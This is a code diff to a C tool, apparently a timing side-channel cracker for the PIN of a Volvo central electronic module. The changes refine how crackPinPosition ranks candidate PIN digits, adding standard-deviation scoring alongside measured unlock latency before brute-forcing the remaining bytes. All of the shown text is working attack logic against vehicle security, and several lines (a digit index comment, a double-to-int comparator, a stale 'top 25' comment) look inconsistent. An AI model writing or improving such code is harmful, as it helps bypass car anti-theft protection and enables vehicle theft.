@@ -10,9 +10,6 @@
 
 /* tunable parameters */
 
-#undef  PLATFORM_P1        /* P1 Platform (S40/V50/C30/C70) MC9S12xxXXX based */
-#define PLATFORM_P2        /* P2 Platform (S60/S80/V70/XC70/XC90) M32C based */
-
 #define SAMPLES        30   /* number of samples per sequence, more is better (up to 100) */
 #define CALC_BYTES     3    /* how many PIN bytes to calculate (1 to 4), the rest is brute-forced */
 
@@ -131,6 +128,7 @@ struct _cem_params {
 typedef struct seq {
   uint8_t  pinValue;    /* value used for the PIN digit */
   uint32_t latency;     /* measured latency */
+  double std;
 } sequence_t;
 
 sequence_t sequence[100] = { 0 };
@@ -534,19 +532,20 @@ void progModeOff (void)
   }
 }
 
-/*******************************************************************************
- *
- * seq_max - quicksort comparison function to find highest latency
- *
- * Returns: integer less than zero, zero or greater than zero
- */
-
-int seq_max (const void *a, const void *b)
+int seq_max_lat(const void *a, const void *b)
 {
   sequence_t *_a = (sequence_t *)a;
   sequence_t *_b = (sequence_t *)b;
 
   return _b->latency - _a->latency;
+}
+
+int seq_max_std(const void *a, const void *b)
+{
+  sequence_t *_a = (sequence_t *)a;
+  sequence_t *_b = (sequence_t *)b;
+
+  return _b->std - _a->std;
 }
 
 /*******************************************************************************
@@ -563,19 +562,19 @@ void crackPinPosition (uint8_t *pin, uint32_t pos, bool verbose)
   uint32_t latency;
   uint32_t prod;
   uint32_t sum;
-  uint8_t  pin1;
-  uint8_t  pin2;
+  double std;
+  uint8_t  pin1, pin2;
   uint32_t i;
   uint32_t k;
-  int best = 0;
-  uint32_t best_prod = 0;
+  uint32_t xmin = cem_reply_avg + AVERAGE_DELTA_MIN;
+  uint32_t xmax = cem_reply_avg + AVERAGE_DELTA_MAX;
 
   /* clear collected latencies */
 
   memset (sequence, 0, sizeof(sequence));
 
   printf("                   us: ");
-  for (i = cem_reply_avg + AVERAGE_DELTA_MIN; i < cem_reply_avg + AVERAGE_DELTA_MAX; i++)
+  for (i = xmin; i < xmax; i++)
     printf("%5d ", i);
   printf("\n");
 
@@ -623,7 +622,7 @@ void crackPinPosition (uint8_t *pin, uint32_t pos, bool verbose)
 
         /* iterate the next PIN digit (third digit) */
 
-        pin[pos + 2] = binToBcd ((uint8_t)j);
+        pin[pos + 3] = binToBcd ((uint8_t)j);
 
         /* try and unlock and measure the latency */
 
@@ -650,6 +649,7 @@ void crackPinPosition (uint8_t *pin, uint32_t pos, bool verbose)
 
     pin[pos + 1] = 0;
     pin[pos + 2] = 0;
+    pin[pos + 3] = 0;
 
     /* clear statistical values we're calculating */
 
@@ -658,7 +658,7 @@ void crackPinPosition (uint8_t *pin, uint32_t pos, bool verbose)
 
     /* loop over the histogram values */
 
-    for (k = cem_reply_avg + AVERAGE_DELTA_MIN; k < cem_reply_avg + AVERAGE_DELTA_MAX; k++) {
+    for (k = xmin; k < xmax; k++) {
       int l = k - cem_reply_min;
       printf ("% 5u ", histogram[l]);
 
@@ -666,20 +666,24 @@ void crackPinPosition (uint8_t *pin, uint32_t pos, bool verbose)
       prod += histogram[l] * l;
       sum  += histogram[l];
     }
+    int mean = sum / (xmax - xmin);
+    long x = 0;
+
+    for (unsigned int k = xmin; k < xmax; k++) {
+      int l = k - cem_reply_min;
+      x += sq(histogram[l] - mean);
+    }
+    std = sqrt((double)x / (xmax - xmin));
 
     /* weighted average */
 
-    printf (": % 10u; best %02x is %s than %02x by %d\n", prod, binToBcd(best), ((int)best_prod - (int)prod) > 0 ? "greater" : "less", pin[pos], abs(best_prod - prod));
-
-    if (best_prod < prod) {
-      best_prod = prod;
-      best = pin1;
-    }
+    printf (": latency % 10u; std %3.2f\n", prod, std);
 
     /* store the weighted average count for this PIN value */
 
     sequence[pin1].pinValue = pin[pos];
     sequence[pin1].latency  = prod;
+    sequence[pin1].std  = std;
 
 
 #if defined(DUMP_BUCKETS)
@@ -696,22 +700,40 @@ void crackPinPosition (uint8_t *pin, uint32_t pos, bool verbose)
 
   /* sort the collected sequence of latencies */
 
-  qsort (sequence, 100, sizeof(sequence_t), seq_max);
+  qsort (sequence, 100, sizeof(sequence_t), seq_max_lat);
 
   /* print the top 25 latencies and their PIN value */
-
-  for (uint32_t i = 0; i < 25; i++) {
-    printf ("%u: %02x = %u\n", i, sequence[i].pinValue, sequence[i].latency);
+  printf("best candidates ordered by latency:\n");
+  for (uint32_t i = 0; i < 5; i++) {
+    printf ("%u: %02x lat = %u\n", i, sequence[i].pinValue, sequence[i].latency);
   }
-
-  /* choose the PIN value that has the highest latency */
-
-  printf ("pin[%u] candidate: %02x with latency %u\n", pos, sequence[0].pinValue, sequence[0].latency);
+  double lat_k = 100.0 * (sequence[0].latency - sequence[1].latency) / sequence[1].latency;
 
   /* set the digit in the overall PIN */
 
   pin[pos] = sequence[0].pinValue;
   pin[pos + 1] = 0;
+
+  qsort (sequence, 100, sizeof(sequence_t), seq_max_std);
+
+  /* print the top 25 latencies and their PIN value */
+
+  printf("\nbest candidates ordered by std:\n");
+  for (uint32_t i = 0; i < 5; i++) {
+    printf ("%u: %02x std = %3.2f\n", i, sequence[i].pinValue, sequence[i].std);
+  }
+  double std_k = 100.0 * (sequence[0].std - sequence[1].std) / sequence[1].std;
+
+  printf("\nlat_k %3.2f%%, std_k %3.2f%%\n", lat_k, std_k);
+
+  if (10 * lat_k > std_k) { /* latency has higher priority than std */
+    /* choose the PIN value that has the highest latency */
+    printf ("pin[%u] choose candidate: %02x based on latency\n", pos, pin[pos]);
+  } else {
+    pin[pos] = sequence[0].pinValue;
+    printf ("pin[%u] choose candidate: %02x based on std\n", pos, pin[pos]);
+  }
+
   free(histogram);
 }
 
